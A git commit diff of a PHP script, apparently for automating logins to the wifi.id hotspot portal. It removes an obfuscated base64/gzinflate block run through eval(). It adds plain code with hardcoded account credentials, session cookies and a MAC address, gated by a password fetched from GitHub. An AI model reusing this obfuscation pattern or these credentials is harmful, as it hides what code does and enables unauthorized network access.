a9b24d83f5ae9de3416d8d7a344caf696aa62580
jompret <67850459+jompret@users.noreply.github.com>
2021-03-24 22:51:46 +0700

    Update run.php

--- run.php
+++ run.php
@@ -1,3 +1,97 @@
-<?php
-$SISTEMIT_COM_ENC = "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";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP="1sfzA+cmmg5OY+CsW5o32M7zPCcNCgpOqInDfZ0LEmEHioGBkQhnP2/23cIXFlT9qtb6r6n+/a8/HclxOU1y/2EM7R9OZ/77679/oPGNMx2s8EsyHw0hDwNKRCv78XesSWWyQW6HyRfJvVZ1CJ+btvWdjvo3K4080eAmrKB25Jm+D2d9CFSZ/4AgfEwrKXagim7Ap8tA";
+<?php 
+	echo "\t [*] Created By Jompret [*] \n";
+	// $file = file(trim(fgets(STDIN)));
+	// echo "\t [?] input delimiter : ";
+	// $delim = trim(fgets(STDIN));
+
+	// foreach ($file as $akon => $data) {
+        // $pisah = explode($delim, $data);
+        // username=Jst593@freeMS.vmgmt&password=924722&landURL=
+   include('simplehtmldom_1_9_1/simple_html_dom.php');
+        
+
+function login(){
+$user = 'Jst616@freeMS.vmgmt';
+        $pass = '704427';
+        $body = "username=$user@spin2&password=$pass";
+
+    $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, 'https://welcome2.wifi.id/authnew/login/check_login.php?ipc=10.200.139.58&gw_id=WAG-D4-KBU&mac=78:02:f8:2d:dd:62&redirect=http://8.8.8.8/&wlan=KTDLG00024-N/TLK-CI-46400:@wifi.id');
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
+        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+
+        $headers = array();
+        $headers[] = 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0';
+        $headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
+        $headers[] = 'Accept-Language: en-US,en;q=0.5';
+        $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
+        $headers[] = 'X-Requested-With: XMLHttpRequest';
+        $headers[] = 'Origin: https://welcome2.wifi.id';
+        $headers[] = 'Connection: keep-alive';
+        $headers[] = 'Referer: https://welcome2.wifi.id/login/?gw_id=WAG-D3-LBG&client_mac=xx:xx:xx:xx:xx:2b&wlan=3CBN000369/3CBN-LBG0102-0211AI:@wifi.id&sessionid=0402FFFF780456CF-5DD92BD0&redirect=http://8.8.8.8/';
+        $headers[] = 'Cookie: default_wifi=53ltq27qh88r73c40hi84ro24bio88gd; SERVERID=wpwifi4; PHPSESSID=28426uqn7550l1kddrf7k5in33';
+        $headers[] = 'Te: Trailers';
+        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+         $result = curl_exec($ch);
+        if (curl_errno($ch)) {
+            echo 'Error:' . curl_error($ch);
+       }
+        curl_close($ch);
+        $json = json_decode($result);
+        $result = $json->result;
+        $msg = $json->message;
+        if ($result == 1) {
+
+        }else{
+            }
+}
+
+function logout(){
+
+    $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, 'https://welcome2.wifi.id/authnew/logout/logoutx.php');
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+
+        $headers = array();
+        $headers[] = 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0';
+        $headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
+        $headers[] = 'Accept-Language: en-US,en;q=0.5';
+        $headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
+        $headers[] = 'X-Requested-With: XMLHttpRequest';
+        $headers[] = 'Origin: https://welcome2.wifi.id';
+        $headers[] = 'Connection: keep-alive';
+        $headers[] = 'Referer: https://welcome2.wifi.id/authnew/logout/logoutx.php';
+        $headers[] = 'Cookie: default_wifi=53ltq27qh88r73c40hi84ro24bio88gd; SERVERID=wpwifi4; PHPSESSID=28426uqn7550l1kddrf7k5in33';
+        $headers[] = 'Te: Trailers';
+        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+      $result = curl_exec($ch);
+}
+
+
+function masukkanpw(){
+	$html = file_get_html('https://raw.githubusercontent.com/jompret/hember/master/README.md');
+	sleep(1);
+	logout();
+        echo "\t [?] input pw : ";
+        $inputan = trim(fgets(STDIN));
+
+if ($html == $inputan) {
+            echo " => Lanjut Login \n";
+            login();
+            echo " => Sukses Login @wifi.id \n";
+        }else{
+            echo " => Login Gagal \n";
+            login();
+            masukkanpw();
+        }
+}
+
+
+login();
+masukkanpw();
+
 ?>
